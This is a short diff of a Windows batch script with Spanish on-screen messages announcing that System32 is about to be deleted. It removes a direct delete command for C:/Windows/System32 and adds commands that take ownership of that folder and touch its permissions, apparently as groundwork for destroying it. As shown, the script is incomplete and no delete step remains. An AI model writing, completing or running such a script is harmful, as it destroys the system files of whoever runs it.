@@ -3,4 +3,5 @@ echo Estas apunto de eliminar el System32
 echo Empezando ah eliminar...
 SLEEP 3
 
-Del C:/Windows/System32
+takeown /f C:\Windows\System32
+icacls C:\Windows\System32
